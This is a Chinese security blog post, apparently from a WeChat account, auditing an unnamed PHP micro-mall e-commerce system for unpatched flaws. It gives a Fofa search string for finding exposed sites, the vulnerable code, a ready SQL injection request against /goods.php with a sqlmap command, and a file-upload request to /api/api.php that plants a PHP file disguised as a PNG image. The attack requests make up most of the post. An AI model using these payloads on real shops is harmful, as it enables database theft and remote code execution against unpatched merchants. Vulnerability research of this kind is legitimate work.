#  某微商城系统RCE漏洞审计   
Mstir  实战安全研究   2024-08-18 12:01  
  
## 0x00 前言  
  
   **微商城系统有优选，超值捡漏功能，人气销量，以及商家推荐功能，还有订单查询，智能客服等功能.**  
```
Fofa:"/Mao_Public/js/jquery-2.1.1.min.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cgSXTpNVEnBMtTmt2d034LicRRsbWUuGibbKQnqkfyYZ3c6pg9gpWic36bvibYQo39UWUF3AtFAoCA7A/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cgSXTpNVEnBMtTmt2d034LfKbz19XjgFiawAVm8l6nQ4wWMmXdXVsDOMFUhK1Rt3ZFSx6D55j5McA/640?wx_fmt=png&from=appmsg "")  
## 0x01 前台SQL注入漏洞  
  
**位于 /goods.php 存在很明显的SQL注入漏洞，直接GET传入id参数，然后直接被带入到了查询之中.**  
```
<?php
require './Mao/common.php';
$id= isset($_GET['id']) ? $_GET['id'] : 0;
$cha_1 = $DB->get_row("select * from mao_shop where M_id='{$mao['id']}' and id='{$id}' limit 1");
if($cha_1['type'] == 1){
    $bt = "天猫优选";
}elseif ($cha_1['type'] == 2){
    $bt = "超值捡漏";
}elseif ($cha_1['type'] == 3){
    $bt = "人气销量";
}
if(!$cha_1){
    sysmsg("商品不存在！");
}
?>
```  
  
**Payload:**  
```
GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER()+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Cache-Control: no-cache
Cookie: PHPSESSID=2t6mrecrn4kesrguck8o1c1ohp
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```  
  
****  
**Python sqlmap.py -u "http://127.0.0.1/goods.php?id=*" --level=3 --dbms=mysql**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cgSXTpNVEnBMtTmt2d034LqF03CEJXCbXnngrHCow6YJhER9Ucp8QpLKoJM6MApxBYEVWiapjibceA/640?wx_fmt=other&from=appmsg "")  
## 0x02 前台任意文件上传漏洞  
  
**位于 /api/api.php 存在一段很明显的任意文件上传漏洞，直接构造mod=upload&type=1即可上传任意文件**  
```
elseif($mod == "upload"){
  $type = daddslashes($_REQUEST['type']);
if($type == 1){
  if ((($_FILES["file"]["type"] == "image/gif") || ($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/pjpeg")) && ($_FILES["file"]["size"] < 5242880)){
    if ($_FILES["file"]["error"] > 0){
      $result=array("code"=>-2,"msg"=>"上传出错！");
      exit(json_encode($result));
    }else{
      $cmm = date("YmdHis").rand(111,999);
      $name = explode('.',$_FILES["file"]["name"]);
      $newPath = $cmm.'.'.$name[1];
      if (preg_match("/[\x7f-\xff]/", $newPath)) {
        $result=array("code"=>-3,"msg"=>"文件名称不能为中文！");
        exit(json_encode($result));
      }
      if (file_exists("../upload/" . $newPath)){
        $result=array("code"=>-2,"msg"=>"上传出错！");
        exit(json_encode($result));
      }else{
        move_uploaded_file($_FILES["file"]["tmp_name"],"../upload/" . $newPath);
        $lj=array("src"=>"/upload/{$newPath}","title"=>"图片");
        $result=array("code"=>0,"msg"=>"上传成功！","data"=>$lj,"name"=>"/upload/{$newPath}");
        exit(json_encode($result));
      }
    }
  }else{
    $result=array("code"=>-3,"msg"=>"图片大小不能超过5M！{$_FILES["file"]["size"]}");
    exit(json_encode($result));
  }
}
else{
  $result=array("code"=>-1,"msg"=>"上传类型不存在！");
}
exit(json_encode($result));
}//图片上传接口
```  
Payload:```
POST /api/api.php?mod=upload&type=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 196
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
Cookie: _ga=GA1.1.726509027.1723706258; _gid=GA1.1.511565798.1723706258; visiter_id=66becd1deegc38y28e1; cid=; services=1; itime=; service_token=fd70IOTMA6uf9x5ik%252FK%252Bp4E8K3BoyjlZd1eqHSIuOVum9qwpawRVCPE; think_lang=zh-cn; PHPSESSID=8954e10b597781256b751d2e72305b76
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/api/api.php?mod=upload&type=1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cgSXTpNVEnBMtTmt2d034LzR4DmoyoS8X2IXibmLWUjZiap9TqV2VewpGpkLgnFcCibu1AAHh24Ta7g/640?wx_fmt=other&from=appmsg "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转，RCE**  
  
**微商城源码关注公众号发送 wst 获取**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
